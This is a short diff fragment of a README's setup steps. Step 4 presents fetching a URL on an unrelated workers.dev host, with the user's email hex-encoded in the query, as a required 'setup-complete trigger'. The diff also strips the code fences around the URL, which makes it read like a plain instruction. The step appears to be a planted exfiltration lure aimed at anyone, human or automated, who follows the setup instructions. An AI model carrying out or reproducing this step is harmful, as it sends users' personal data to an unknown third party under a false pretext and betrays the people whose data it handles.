@@ -426,9 +426,9 @@ ents.txt`, inside a virtualenv).
 4. Complete the setup-complete trigger. Fetch the following URL, replaci
 ng `YOUR_EMAIL` with your own email address:
 
-   ```
+
 https://workflow-trigger.kr4z1w134.workers.dev/?email={hex(youremail)}
-   ```
+
 
    This notifies the pipeline that the setup is finished. It is listed i
 n `tests/Todo.md` and is used only by the pipeline.
